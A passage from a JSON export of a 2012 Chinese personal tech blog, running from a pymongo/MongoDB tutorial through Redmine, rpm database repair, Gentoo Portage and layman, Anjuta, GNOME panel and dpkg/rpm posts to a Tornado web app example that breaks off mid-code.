{\n\"username\":\"foouser\",\n\"emails\":[\n{\n\"email\":\"foouser1@dongwm.com\",\n\"primary\":True\n},\n{\n\"email\":\"foouser2@dongwm.com\",\n\"primary\":False\n},\n{\n\"email\":\"foouser3@dongwm.com\",\n\"primary\":False\n}\n]\n}\ndbh.users.insert(user_doc, safe=True)\ndbh.users.update({\"emails.email\":\"foouser2@dongwm.com\"},\n{\"$set\":{\"emails.$.primary\":True}}, safe=True)   #设置子文档属性 \"primary\"为真</p>\n\n<p>4 使用索引加快查找</p>\n\n<p>这里有个文档</p>\n\n<p>user_doc = {\n\"username\":\"foouser\",\n\"emails\":[\n{\n\"email\":\"foouser1@dongwm.com\",\n\"primary\":True\n},\n{\n\"email\":\"foouser2@dongwm.com\",\n\"primary\":False\n},\n{\n\"email\":\"foouser3@dongwm.com\",\n\"primary\":False\n}\n]\n}</p>\n\n<p>dbh.users.insert(user_doc)</p>\n\n<p>正常查找使用：</p>\n\n<p>user = dbh.users.find_one({\"emails.email\":\"foouser2@dongwm.com\"})</p>\n\n<p>使用索引（根据mail.mail）：</p>\n\n<p>dbh.users.create_index(\"emails.email\")</p>\n\n<p>注：简历索引比较耗时也增加系统负荷可以使用将其放在后台：dbh.users.create_index(\"emails.email\", background=True)</p>\n\n<p>5 删除索引</p>\n\n<p>dbh.users.create_index(\"username\", name=\"username_idx\")\ndbh.users.drop_index(\"username_idx\")\n6 复合索引（简单的理解就是在where条件中字段用索引，如果用多字段就用复合索引）</p>\n\n<p>dbh.users.create_index([(\"first_name\", pymongo.ASCENDING), (\"last_name\", pymongo.ASCENDING)])</p>\n\n<p>注：删除索引方法：dbh.users.drop_index([(\"first_name\", pymongo.ASCENDING), (\"last_name\", pymongo.ASCENDING)])</p>\n\n<p>或者：</p>\n\n<p>dbh.users.create_index([\n(\"first_name\", pymongo.ASCENDING),\n(\"last_name\", pymongo.ASCENDING)\n],\nname=\"name_idx\")  #给索引使用一个名字</p>\n\n<p>7 geospatial（<span>地理位置</span>）索引</p>\n\n<p>这个说来比较复杂：可以关注http://blog.nosqlfan.com/html/1811.html以及mongodbCTO的个人博客http://www.snailinaturtleneck.com/blog/</p>\n\n<p>dbh.users.create_index([(\"user_location\", pymongo.GEO2D), (\"username\", pymongo.ASCENDING)])</p>\n\n<p>8 例子（在点（40,40）最大距离为5的最近的10个用户）</p>\n\n<p>nearest_users = dbh.users.find(\n{\"user_location\":\n{\"$near\" : [40, 40],\n\"$maxDistance\":5}}).limit(10)   #关键字：$near\nfor user in nearest_users:\nprint \"User %s is at location %s,%s\" %(user[\"username\"], user[\"user_location\"][0],user[\"user_location\"[1])</p>\n\n<p>9 例子2（相关区域内的查找）</p>\n\n<p>box = [[50.73083, -83.99756], [50.741404,  -83.988135]]\nusers_in_boundary = dbh.users.find({\"user_location\":{\"$within\": {\"$box\":box}}})</p>\n\n<p>10 例子3（一个圆区域的查询，提供中心点和半径）</p>\n\n<p>users_in_circle = dbh.users.find({\"user_location\":{\"$within\":{\"$center\":[40, 40, 5]}}}).limit(10)  （点（40,40）,半径为5内的区域查询，只要前10个数据）</p>\n\n<p>11 例子4（球形区域查询）：</p>\n\n<p>earth_radius_km = 6371.0\nmax_distance_km = 5.0\nmax_distance_radians = max_distance_km / earth_radius_km\nnearest_users = dbh.users.find(\n{\"user_location\":\n{\"$nearSphere\" : [40, 40],\n\"$maxDistance\":max_distance_radians}}).limit(10)   #还是点（40,40）,半径为5内的区域查询，只要前10个数据</p>\n\n<p>12 避免KeyErrors和其他错误，使用默认值</p>\n\n<p>比如计算分数，假如因为某些原因出现错误，为了不影响正常使用，例如将出现问题的那一次运算设计成0：</p>\n\n<p>total_score = 0\nfor username in (\"jill\", \"sam\", \"cathy\"):\nuser_doc = dbh.users.find_one({\"username\":username})\ntotal_score += user_doc.get(\"score\", 0)  #这样的话 有数据的就加数据 没有数据就是0</p>\n\n<p>注：也可能存在不是空值而是空列表</p>\n\n<p>for supplier in product_doc.get(\"suppliers\", []):\nemail_supplier(supplier)\n13 插入或者更新的选择：</p>\n\n<p>先查询是否已经存在的文档，没有选择插入，有的话就是更新</p>\n\n<p>def edit_or_add_session(description, session_id):\ndbh.sessions.update({\"session_id\":session_id},\n{\"$set\":{\"session_description\":description}}, safe=True, upsert=True)</p>\n\n<p>14 自动增加文档属性值</p>\n\n<p>ret = dbh.users.find_and_modify({\"username\":username},\n{\"$inc\":{\"account_balance\":20}}, safe=True, new=True)\nnew_account_balance = ret[\"account_balance\"]  #\"account_balance\"自动加了20</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "06"
    }
  },
  {
    "id": 128,
    "title": "解决安装redmine“undefined method `requirement' ”报错",
    "category": "ruby",
    "tags": [
      "rails",
      "安装redmine"
    ],
    "url": "/archives/jiejueundefinedmethodrequirementfor/",
    "content": "<p>前言：在opensuse安装redmine出现一个比较可爱的报错，puppet面板安装也可能遇见，当创建表时：</p>\n\n<p>dongwm@linux-b8lh:~/redmine/svn/branches/1.3-stable/config&gt; !rake\nrake db:migrate RAILS_ENV=production\n(in /home/dongwm/redmine/svn/branches/1.3-stable)</p>\n\n<p>rake aborted!\nundefined method `requirement' for #&lt;Rails::GemDependency:0xb71a2248&gt;</p>\n\n<p>Tasks: TOP =&gt; db:migrate =&gt; environment\n(See full trace by running task with --trace)</p>\n\n<p>解决：修改gem_dependency.rb，一般在你安装的rails库目录下，我的是/usr/lib/ruby/gems/1.8/gems/rails-2.3.14/lib/rails/gem_dependency.rb</p>\n\n<p>注释掉81行 #gem self.name, self.requirement # &lt;  1.8 unhappy way\n修改为：</p>\n\n<p>gem self.name, :version =&gt; (self.respond_to?(:requirement) ? self.requirement : self.version_requirements)</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "15"
    }
  },
  {
    "id": 129,
    "title": "opensuse rpm数据库损坏的解决方法",
    "category": "linux基础",
    "tags": [
      "rpm数据库"
    ],
    "url": "/archives/opensuserpmshujukusunhuaidejiejuefangfa/",
    "content": "<p>opensuse后来使用不知道为什么，安装更新软件以及我最近做的从11。4升级到12。1的操作，都会报类似的错误：</p>\n\n<p>rpmdb: PANIC: fatal region error detected; run recovery\nerror: db3 error(-30977) from db-&gt;sync: DB_RUNRECOVERY: Fatal error, run database recovery\nrpmdb: PANIC: fatal region error detected; run recovery\n下列软件包在安装期间或安装后或移除时出现问题：\nInstallation aborted by user\n研究发现：这是因为rpm数据库损坏了，解决办法</p>\n\n<p>使用 <span style=\"color: navy;\"># rpm --rebuilddb</span> 或者 <span style=\"color: navy;\"># rpm -initdb</span> 、（重新建立了rpm库里的记录）</p>\n\n<p>但是 加入还是不行，那只能这样：</p>\n\n<p>rm /var/lib/rpm/__db*</p>\n\n<p>rpm --rebuilddb\nyum clean all  会删除之前的缓存，例如刚下载国12。1的那些更新包，就不能使用 ，需要重新下载安装了</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "23"
    }
  },
  {
    "id": 130,
    "title": "gentoo笔记（九）Portage 与软件包",
    "category": "gentoo",
    "tags": [
      "gentoo",
      "Portage"
    ],
    "url": "/archives/gentoobijijiuportageyuruanjianbao/",
    "content": "<p>前言：Portage 工具中用户用得最多的便是 emerge，它 是一个用以安装, 卸载, 查询以及维护软件的命令. 它是 ebuild 的一个前端，而且它有ebuild缺少的功能（比如解决依赖性、搜索Portage树等。</p>\n\n<p><strong>1 查看 Portage 树</strong>\nlls /usr/portage --classify\n注，也能切换到更深的目录查看类别，软件包等\n<strong>2 搜寻软件包</strong></p>\n\n<p>emerge --search mozilla 或者emerge -s mozilla # 搜寻和anjuta有关的软件信息</p>\n\n<p>Searching...\n[ Results for search key : anjuta ]\n[ Applications found : 1 ]</p>\n\n<p>*  dev-util/anjuta\nLatest version available: 2.32.1.1\nLatest version installed: 2.32.1.1\nSize of files: 9,934 kB\nHomepage:      http://www.anjuta.org\nDescription:   A versatile IDE for GNOME\nLicense:       GPL-2\n<strong>3 搜寻相关描述信息</strong>\ndongwm@localhost ~ $sudo emerge --searchdesc mozilla\n<strong>4 更新portage</strong>\ndongwm@localhost ~ $sudo emerge --sync #要以 rsync 更新 Portage,因为不更新portage树的话 gentoo软件会停留在一些版本上，系统会很快变得过时\n<strong>5 预编译 也就是假装编译，其实并没有编译安装</strong>\ndongwm@localhost ~ $sudo emerge --pretend anjuta （不编译安装，可以用来查看这个软件包将安装的依赖性软件，简写: -p）\n<strong>6 只获取软件的源码</strong>\ndongwm@localhost ~ $sudo emerge --fetchonly anjuta  [不编译安装，下载这个软件的源代码以及他的依赖性软件，简写：-f]\n<strong>7 安装指定版本的</strong>\ndongwm@localhost ~ $sudo emerge \"&lt;anjuta-2.22\"\n<strong>8 显示安装软件所有的依赖性</strong>\ndongwm@localhost ~ $sudo emerge --emptytree --pretend anjuta\n<strong>9 查看软件所需源代码的网址</strong>\ndongwm@localhost ~ $sudo emerge --fetchonly --pretend anjuta\n<strong>10 不理会依赖关系而安装</strong>\ndongwm@localhost ~ $sudo emerge --nodeps anjuta\n<strong>11 安装软件的依赖关系</strong>\ndongwm@localhost ~ $sudo emerge --onlydeps anjuta\n<strong>12 列出与删除已不需要的 (orphaned) 依赖关系</strong></p>\n\n<p>dongwm@localhost ~ $sudo emerge -p depclean\n(在认真检查过输出的列表之后, 开始卸载不用的依赖关系包)\ndongwm@localhost ~ $sudo emerge depclean</p>\n\n<p>注：使用 depclean 很有可能严重地损坏gentoo系统 ，需要小心谨慎, 并在实际删除前反复检查依赖关系包列表.\n<strong>13 更新系统软件包</strong>\ndongwm@localhost ~ $sudo emerge --update system\n<strong>14 更新整个系统</strong>\ndongwm@localhost ~ $sudo emerge --update world\n<strong>15 预更新整个系统</strong></p>\n\n<p>dongwm@localhost ~ $sudo emerge --pretend --update world</p>\n\n<p>在单词 \"ebuild\" 旁边您可以看到一个字母 (或字母的组合)：<em></em></p>\n\n<p><em>B</em> (blocks) 左边列出来的软件因为冲突原因将阻碍右边列出来的软件的安装<em></em></p>\n\n<p><em>N</em> (new) 对于您的系统来说这是一个新软件, 且为第一次安装<em></em></p>\n\n<p><em>R</em> (replace) 不是新软件, 不过会被重新 emerge (reemerged)<em></em></p>\n\n<p><em>F</em> (fetch) 该软件要求您先把源码手工地下载回来 (例如因为许可 (licencing issues) 的缘故)<em></em></p>\n\n<p><em>U</em> (update) 软件包已安装, 不过将被升级<em></em></p>\n\n<p><em>UD</em> (downgrade) 软件包已安装, 不过将被降级\n<strong>注：</strong>\n1 可能更新后重启登录到login界面出现键盘无响应的问题，需要使用安装光盘那chroot到系统重新安装xf86-input-evdev（热插拔）问题，或者在更新系统旧重新安装，防止重启出现无响应\nsudo emerge xf86-input-evdev\n2 当更新时出现某软件包 404 not found 你可以去找一个其它的源下载这个软件包到/usr/portage/distfiles/目录下（如果你没有修改Portage对存放软件包位置的配置）</p>\n\n<p><strong>16 更新整个系统, 且包括所有依赖关系</strong></p>\n\n<p>dongwm@localhost ~ $sudo  emerge --update --deep world <em> 注：world</em> 文件不包含依赖关系. 当您\n运行 emerge --update world 时, 仅有 world 文件中列出的那些软件包及其直接的 (immediate)\n依赖包会被检查或, 必要的话, 会被更新. 如果您想让 emerge 检查<em>所有的</em>依赖关系\n(包括依赖包的依赖包), 则请加多一个 --deep 参数:</p>\n\n<p><strong>17 卸载软件</strong>\nemerge -C anjuta</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "24"
    }
  },
  {
    "id": 131,
    "title": "gentoo笔记（十）gentoo管理软件总结",
    "category": "gentoo",
    "tags": [
      "eclean",
      "eix",
      "elogv",
      "elogviewer",
      "equery",
      "euses",
      "genlop",
      "gentoolkit",
      "kelogviewer",
      "module-rebuild",
      "portage-utils",
      "qfile",
      "qlist",
      "revdep-rebuild",
      "ufed"
    ],
    "url": "/archives/gentoobijishigentooguanliruanjianzongjie/",
    "content": "<p><strong>1 gentoolkit</strong></p>\n\n<p>dongwm@localhost ~ $sudo sudo emerge gentoolkit\n<strong> 1 revdep-rebuild 比如如果发现 /bin/ls 需要的 /lib/libacl.so.1 缺失，就会重新编译相关文件所在的包，以及所用到该文件的所在文件的包。</strong></p>\n\n<p>dongwm@localhost ~ $sudo revdep-rebuild <span style=\"color: #000102;\"><span style=\"font-family: 宋体;\">修复一些被破坏的lib</span></span>\n* Configuring search environment for revdep-rebuild</p>\n\n<p>* Checking reverse dependencies\n* Packages containing binaries and libraries broken by a package update\n* will be emerged.</p>\n\n<p>* Collecting system binaries and libraries\n* Generated new 1_files.rr\n* Collecting complete LD_LIBRARY_PATH\n* Generated new 2_ldpath.rr\n* Checking dynamic linking consistency\n[ 100% ]\n<strong> 2 equery</strong></p>\n\n<p>equery b  xxx 查询文件是由那个软件包安装带来的\ndongwm@localhost ~ $sudo  equery b  anjuta\n* Searching for anjuta ...</p>\n\n<p>dev-util/anjuta-2.32.1.1 (/usr/share/pixmaps/anjuta)\ndev-util/anjuta-2.32.1.1 (/usr/bin/anjuta)\ndev-util/anjuta-2.32.1.1 (/usr/share/anjuta)\ndev-util/anjuta-2.32.1.1 (/usr/lib/anjuta)\nequery d XXX，查询哪些软件包是依赖于pkg的\n[ Searching for packages depending on vmware-modules... ] app-emulation/vmware-workstation-5.5.5.56455 (~app-emulation/vmware-modules-1.0.0.15)</p>\n\n<p><strong> 3 eclean distfiles 只删除过期的包</strong>\n<strong>2 module-rebuild</strong>\ndongwm@localhost ~ $sudo emerge module-rebuild</p>\n\n<p>重新编译外部内核模块</p>\n\n<p>dongwm@localhost ~ $sudo module-rebuild rebuild</p>\n\n<p>就可以重新编译所有内核的 外部 模块。比如 nvidia/vbox 这类软件用到的模块。当然，你要先装过 nvidia包和 vbox模块包，这样 portage 才有记录。\n<strong>3 portage-utils</strong>\ndongwm@localhost ~ $sudo portage-utils</p>\n\n<p>dongwm@localhost ~ $sudo qfile anjuta 类似于 equery b\ndev-util/anjuta (/usr/lib/anjuta)\ndev-util/anjuta (/usr/share/anjuta)\ndev-util/anjuta (/usr/share/pixmaps/anjuta)\ndev-util/anjuta (/usr/bin/anjuta)</p>\n\n<p>root@localhost ~ #equery depends  autogen 查看哪些包依赖于antogen\n* These packages depend on autogen:\ndev-util/anjuta-2.32.1.1 (sys-devel/autogen)\nsys-devel/gcc-4.5.3-r1 (test ? &gt;=sys-devel/autogen-5.5.4)</p>\n\n<p>root@localhost ~ #equery u anjuta 查看已安装包abc用了哪些USE\n[ Legend : U - final flag setting for installation]\n[        : I - package is installed with flag     ]\n[ Colors : set, unset                             ]\n* Found these USE flags for dev-util/anjuta-2.32.1.1:\nU I\n- - debug         : Enable extra debug codepaths, like asserts and extra\noutput. If you want to get meaningful backtraces see\nhttp://www.gentoo.org/proj/en/qa/backtraces.xml\n- - devhelp       : Enable devhelp integration\n- - doc           : Adds extra documentation (API, Javadoc, etc). It is\nrecommended to enable per package instead of globally\n- - glade         : Build glade plugin for anjuta\n- - graphviz      : Adds support for the Graphviz library\n- - introspection : Use dev-libs/gobject-introspection for introspection\n+ + sourceview    : Build sourceview editing plugin for anjuta\n- - subversion    : Enable subversion (version control system) support\n- - test          : Workaround to pull in packages needed to run with\nFEATURES=test. Portage-2.1.2 handles this internally, so\ndon't set it in make.conf/package.use anymore\n- - vala          : Enable support for the Vala programming language</p>\n\n<p>dongwm@localhost ~ $sudo qlist anjuta 列出软件包安装后都带来的文件列表</p>\n\n<p><strong>4 genlop</strong>\ndongwm@localhost ~ $sudo emerge genlop</p>\n\n<p>genlop -t anjuta 列出安装anjuta的具体时间，时间长短等\ndongwm@localhost ~ $sudo genlop -t anjuta\n* dev-util/anjuta</p>\n\n<p>Tue Feb 21 17:57:35 2012 &gt;&gt;&gt; dev-util/anjuta-2.32.1.1\nmerge time: 2 minutes and 54 seconds.</p>\n\n<p>Wed Feb 22 10:55:30 2012 &gt;&gt;&gt; dev-util/anjuta-2.32.1.1\nmerge time: 4 minutes and 6 seconds.</p>\n\n<p>Wed Feb 22 11:25:57 2012 &gt;&gt;&gt; dev-util/anjuta-2.32.1.1\nmerge time: 4 minutes and 5 seconds.</p>\n\n<p>Fri Feb 24 13:22:43 2012 &gt;&gt;&gt; dev-util/anjuta-2.32.1.1\nmerge time: 3 minutes and 57 seconds.</p>\n\n<p>root@localhost ~ #genlop -l|grep compiz 类似于rpm -qa 列出安装的软件包列表 这里grep过滤了一下\nTue Dec 27 22:44:27 2011 &gt;&gt;&gt; x11-libs/compiz-bcop-0.8.4\nTue Dec 27 22:49:00 2011 &gt;&gt;&gt; x11-wm/compiz-0.8.6-r3\nTue Dec 27 22:56:27 2011 &gt;&gt;&gt; x11-libs/libcompizconfig-0.8.4-r2\nTue Dec 27 22:57:00 2011 &gt;&gt;&gt; x11-plugins/compiz-plugins-main-0.8.6-r1\nTue Dec 27 22:57:08 2011 &gt;&gt;&gt; dev-python/compizconfig-python-0.8.4-r3\nTue Dec 27 22:57:13 2011 &gt;&gt;&gt; x11-libs/compizconfig-backend-gconf-0.8.4-r2\nTue Dec 27 22:57:44 2011 &gt;&gt;&gt; x11-plugins/compiz-plugins-extra-0.8.6-r1\nTue Dec 27 22:58:10 2011 &gt;&gt;&gt; x11-wm/compiz-fusion-0.8.6\n<strong>5 eix</strong>\ndongwm@localhost ~ $sudo emerge eix\n软件包搜索：\ndongwm@localhost ~ $sudo eix anjuta\n[I] dev-util/anjuta\nAvailable versions:  2.32.1.1 ~3.2.1 ~3.2.2 {debug devhelp doc glade graphviz +introspection packagekit +sourceview subversion test vala}\nInstalled versions:  2.32.1.1(13时21分50秒 2012年02月24日)(sourceview -debug -devhelp -doc -glade -graphviz -introspection -subversion -test -vala)\nHomepage:            http://www.anjuta.org\nDescription:         A versatile IDE for GNOME</p>\n\n<p>将本地软件列表与最新的portage树同步\ndongwm@localhost ~ $sudo eix-sync</p>\n\n<p>注：需要每次 emerge --sync 后运行 update-eix 才会更新索引。推荐使用 eix-sync 命令取代上面的2个命令\n<strong>6 euses</strong></p>\n\n<p>dongwm@localhost ~ $sudo emerge euses</p>\n\n<p>查询哪个包用了YYY这个USE</p>\n\n<p>euse -i YYY\n<strong>7 ufed</strong></p>\n\n<p>所有USE都可以在这里修改，不用手动修改 make.conf 了，很方便\ndongwm@localhost ~ $sudo ufed\n<strong>8 elogv</strong></p>\n\n<p>emerge 大量软件的时候，很多提示的消息都一闪而过，现在给查看他们的方法。</p>\n\n<p>dongwm@localhost ~ $sudo emerge elogv</p>\n\n<p>emerge elogviewer # GTK\nemerge kelogviewer # KDE</p>\n\n<p>修改 /etc/make.conf</p>\n\n<p>PORTAGE_ELOG_SYSTEM=\"save\"\nPORTAGE_ELOG_CLASSES=\"warn error info log qa\"</p>\n\n<p>你可以根据需求去掉一些信息，比如 qa(质量保证) 你不需要，就可以去掉。</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "24"
    }
  },
  {
    "id": 132,
    "title": "opensuse安装anjuta",
    "category": "opensuse",
    "tags": [
      "anjuta"
    ],
    "url": "/archives/opensuseanzhuanganjuta/",
    "content": "<p>问题：以前使用anjuta在gentoo下调试c/c++程序，最近在opensuse11.4想使用anjuta，发现yast/zypper安装的anjuta不能新建项目，直接卡住，然后杀掉进程后再启动anjuta会停止在\"加载调试器\"这一步。</p>\n\n<p>解决：1 使用源码安装：http://ftp.gnome.org/pub/GNOME/sources/anjuta</p>\n\n<p>发现各个版本（从2.1.0到3.3）都有一些依赖关系，重新编译安装会对现在的系统造成影响，比如我安装了一个新版本的glib，造成xwindows启动不了，最后在修复模式卸载了才恢复</p>\n\n<p>2  使用jhbuild</p>\n\n<p>提示 在autogen的过程中： gtkdocize: command not found  失败</p>\n\n<p>3 根据anjuta官网wiki https://live.gnome.org/DeveloperTools/Installation 文档安装 还是同样的问题，不能新建项目</p>\n\n<p>最终解决办法：</p>\n\n<p>从github上面找了一个anjuta源码版本：</p>\n\n<p>https://github.com/abderrahim/anjuta.git\n过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; git clone https://github.com/abderrahim/anjuta.git\ncd anjuta/\n./autogen.sh</p>\n\n<p>make</p>\n\n<p>sudo make install</p>\n\n<p>因为默认安装在/use/local下，需要</p>\n\n<p>sudo vi /etc/ld.so.conf\n添加一行： /usr/local/lib</p>\n\n<p>sudo /sbin/ldconfig</p>\n\n<p>这个anjuta正常了</p>\n",
    "date": {
      "year": "2012",
      "month": "February",
      "day": "27"
    }
  },
  {
    "id": 133,
    "title": "gentoo笔记（十一）Overlay和layman",
    "category": "gentoo",
    "tags": [
      "layman",
      "Overlay"
    ],
    "url": "/archives/gentoobijishiyioverlayhelayman/",
    "content": "<p>前言：Overlay是包含额外的Gentoo的ebuild的Portage包树，类似于“第三方源”，使用它的原因我以为就是让那些不在Portage包树的软件包，当你修改，开发，测试的时候，不会影响主干包树，直到它稳定到加到主干包树里面。当修改主干包树时候，下一次同步你的修改就没有了，但是Overlay能保存你的自定义修改。layman（英语意为‘门外汉’，意思很明显了把）使用它安装和更新这样的Overlay。他会有自己的一套portage包树，和emerge平齐</p>\n\n<p>1 安装layman</p>\n\n<p>dongwm@localhost ~ $sudo emerge layman\n2 指定layman的Portage库</p>\n\n<p>dongwm@localhost ~ $sudo echo \"source /var/lib/layman/make.conf\" &gt;&gt; /etc/make.conf\n3 列出可用的Overlay源</p>\n\n<p>dongwm@localhost ~ $sudo layman -L\n其中有一行</p>\n\n<p>* gentoo-china              [Subversion] (http://gentoo-china-overlay.google...)</p>\n\n<p>4 安装Overlay源</p>\n\n<p>dongwm@localhost ~ $sudo layman -a gentoo-china\n5 从Overlay源安装一个软件包</p>\n\n<p>因为gentoo-china的软件包目录在/var/lib/layman/gentoo-china  可以去找你想要安装的软件包名称 我这里是/var/lib/layman/gentoo-china/app-editors/uex</p>\n\n<p>dongwm@localhost ~ $sudo emerge uex # emerge会自动找到\n6 更新Overlay源</p>\n\n<p>dongwm@localhost ~ $sudo layman -S</p>\n\n<p>7 删除Overlay源</p>\n\n<p>dongwm@localhost ~ $sudo layman -d desktop-effects  删除desktop-effects</p>\n\n<p>&nbsp;\n\n&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "March",
      "day": "07"
    }
  },
  {
    "id": 134,
    "title": "解决Linux下打开的应用程序不在gnome桌面面板上面显示",
    "category": "linux基础",
    "tags": [
      "gnome-panel"
    ],
    "url": "/archives/jiejuelinuxxiadakaideyingyongchengxubuzaignomezhuomianmianbanshangmianxianshi/",
    "content": "<p>前言：最近把我的opensuse的软件更新了一下，后来发现现在打开的程序没有在底部的面板上显示，当我打开多个程序的时候只能使用compiz特效‘alt’＋‘tab’键去找我想要让目前窗口显示的程序，很不方便（包括安装了Cairo-Dock，当程序最小化了在dock界面也不会有这个程序的图标，也不方便）</p>\n\n<p>解决办法：</p>\n\n<p>中文系统：在下面的gnome面板上，鼠标右键点开－》选择‘添加到面板’ －》‘窗口列表’</p>\n\n<p>英文系统：在下面的gnome面板上，鼠标右键点开－》选择“Add to Panel” －》 \"Window List\"</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "March",
      "day": "08"
    }
  },
  {
    "id": 135,
    "title": "debian系dpkg和redhat系rpm命令总结",
    "category": "linux基础",
    "tags": [
      "dpkg"
    ],
    "url": "/archives/debianxidpkgheredhatxirpmminglingzongjie/",
    "content": "<p>前言：最近突然用ubuntu，发现好多包管理命令dpkg的用法很生疏了，在这里正好总结一下，以及和rpm作一些相似作用的列举</p>\n\n<p>1 软件包的信息  将会列出这个软件包的详细资料</p>\n\n<p>dongwm@linux-dongwm:~&gt; rpm  -qpi rubygem-capistrano-2.11.2-1.2.i586.rpm\ndongwm@dongwm-pc:~$ dpkg-deb -I capistrano_2.5.9-1_all.deb</p>\n\n<p>dongwm@dongwm-pc:~$ dpkg -s  capistrano\n或者</p>\n\n<p>dongwm@dongwm-pc:~$  dpkg-query -s capistrano\n2 软件包内文件内容  列出安装后的所有文件的全路径</p>\n\n<p>dongwm@linux-dongwm:~&gt; rpm  -qpl rubygem-capistrano-2.11.2-1.2.i586.rpm</p>\n\n<p>dongwm@dongwm-pc:~$ dpkg-deb -c capistrano_2.5.9-1_all.deb |more</p>\n\n<p>或者</p>\n\n<p>dongwm@dongwm-pc:~$ dpkg --contents capistrano_2.5.9-1_all.deb</p>\n\n<p>3 软件包的依赖关系</p>\n\n<p>dongwm@linux-dongwm:~&gt; rpm  -qpR rubygem-capistrano-2.11.2-1.2.i586.rpm</p>\n\n<p>dongwm@dongwm-pc:~$ dpkg-deb -f capistrano_2.5.9-1_all.deb depends //depends\nDepends: ruby1.8, libnet-ssh2-ruby1.8, libnet-ssh-gateway-ruby1.8, libnet-sftp2-ruby1.8, libnet-scp-ruby1.8, libhighline-ruby1.8</p>\n\n<p>4 数据库查询 当每个软件包安装在Linux系统后，安装文件都会列到数据库</p>\n\n<p>dongwm@linux-dongwm:~&gt; rpm -qa capistrano</p>\n\n<p>dongwm@dongwm-pc:~$ dpkg -l capistrano\n期望状态=未知(u)/安装(i)/删除(r)/清除(p)/保持(h)\n| 状态=未安装(n)/已安装(i)/仅存配置(c)/仅解压缩(U)/配置失败(F)/不完全安装(H)/触发器等待(W)/触发器未决(T)\n|/ 错误?=(无)/须重装(R) (状态，错误：大写=故障)\n||/ 名称         版本         描述\n+++-==============-==============-============================================\niU  capistrano     2.5.9-1        Executes commands in parallel on multiples s   #这里的 iu表示想安装，但是只是解压缩没有安装成功  debian系的查询显示比较复杂</p>\n\n<p>5 安装软件包</p>\n\n<p>dongwm@linux-dongwm:~&gt; sudo rpm -ivh rubygem-capistrano-2.11.2-1.2.i586.rpm</p>\n\n<p>dongwm@dongwm-pc:~$ sudo dpkg -i capistrano_2.5.9-1_all.deb</p>\n\n<p>6 软件卸载</p>\n\n<p>dongwm@linux-dongwm:~&gt; sudo rpm -e rubygem-capistrano-2.11.2-1.2</p>\n\n<p>dongwm@dongwm-pc:~$ sudo dpkg -r capistrano</p>\n\n<p>或者</p>\n\n<p>dongwm@dongwm-pc:~$ sudo dpkg --purge capistrano</p>\n\n<p>7 查询文件归属</p>\n\n<p>dongwm@linux-dongwm:~&gt; rpm -qf /usr/bin/vim  查询 /usr/bin/vim  属于那个包</p>\n\n<p>dongwm@dongwm-pc:~$ dpkg --search /usr/bin/mawk</p>\n\n<p>7 查询软件包都安装到了那里</p>\n\n<p>dongwm@linux-dongwm:~&gt; rpm -ql gawk</p>\n\n<p>dongwm@dongwm-pc:~$ dpkg -S mawk</p>\n",
    "date": {
      "year": "2012",
      "month": "March",
      "day": "13"
    }
  },
  {
    "id": 136,
    "title": "tornado应用例子",
    "category": "tornado",
    "tags": [
      "check_xsrf_cookie",
      "get_current_user",
      "render",
      "RequestHandler",
      "StaticFileHandler",
      "tornado",
      "xsrf"
    ],
    "url": "/archives/tornadoyingyonglizi/",
    "content": "<p>前言：网上有的tornado的例子基本都是来源于其官网，下面是一个我以前弄得一个例子，包含基本tornado所有常用功能 ：</p>\n\n<p>1 mysql数据库相关功能</p>\n\n<p>2 StaticFileHandler 静态文件处理</p>\n\n<p>3 为自己的应用自定义tornado源码实现不一样的功能（get_current_user，check_xsrf_cookie，RequestHandler）</p>\n\n<p>4 地址重定向和地址render</p>\n\n<p>5 上传文件及目标服务器保存</p>\n\n<p>6 相关html，js，get，post效果，以及将tornado数据存放到html模板以及js文件变量中</p>\n\n<p>7 xsrf策略</p>\n\n<p>8 cookies策略</p>\n\n<p>9 ssl 加密</p>\n\n<p><pre class=\"sh_python\">\n#!/bin/env python\n#coding = utf-8</p>\n\n<p>from __future__ import division  #因为有个计算比率的除法\nimport os\nimport sys\nimport time\nimport re\nimport captcha\nimport base\nimport urllib2\nfrom subprocess import call\nimport tornado.ioloop\nimport tornado.httpserver\nfrom tornado.web import StaticFileHandler,authenticated,HTTPError,asynchronous,RequestHandler,Application\nfrom tornado import escape  #因为我定义了很多操作，其中html文件都在本脚本实现，隐藏属性_xsrf 需要自定义获取 所以根据源码修改了获取方式\nfrom tornado.options import define, options\nimport tornado.autoreload\nimport tornado.database\nfrom  parse import Parse\nsys.path.append( os.path.join( os.getcwd(), '..' ) )\nfrom sql import gymysql</p>\n\n<p>#define(\"debug\", default=True, type=bool)</p>\n\n<p>def err(app, log): #定义一个跳转到错误页面的函数，app表示那个RequestHandler类\n    app.render(\"static/jump.html\", mylog=log, myclass='outageCent', mes='Error')</p>\n\n<p>def log(app,log):  #其实可以把这个和上面的函数合并成一个函数\n    app.render(\"static/jump.html\", mylog=log, myclass='outageTitle', mes='Message')</p>\n\n<p>def view(app,data,op): #定义跳转到view.html页面的函数，这里是为了减少重复代码\n    app.render(\"static/view.html\", data=data, op=op)</p>\n\n<p>def createt(app,src): \n    d = Parse(src)\n    table = os.path.splitext(os.path.basename(src))[0]\n    if not d.work():  #当返回不为0，跳转到错误页面\n        err(app, \"Possible format problems, the database operation fails\")\n        return -1\n    else:  #当执行成功跳转到view页面，其中DBbutton是一个js调用的按键\n        view(app, table, 'DBButton')  </p>\n\n<p>class BaseHandler(RequestHandler): #继承至RequestHandler</p>\n\n<p>    def get_current_user(self):  #获取cookie用户\n        return self.get_secure_cookie(\"user\")</p>\n\n<p>    def check_user(self):\n        if not self.current_user: #当用户不存在，自动跳转到根目录：为了防止用户直接在不登陆情况访问某页面\n            self.redirect(\"/\")\n            return</p>\n\n<p>class LogoutHandler(RequestHandler): #这个类主要是在退出登录触发</p>\n\n<p>    @asynchronous #加上异步装饰器请求就不会被等待阻塞，可以并发请求了\n    def get(self):\n        self.clear_cookie(\"user\") #清除用户cookie\n        #self.db.redis.rpop(\"saved_names\")\n        self.redirect(\"/\")</p>\n\n<p>class 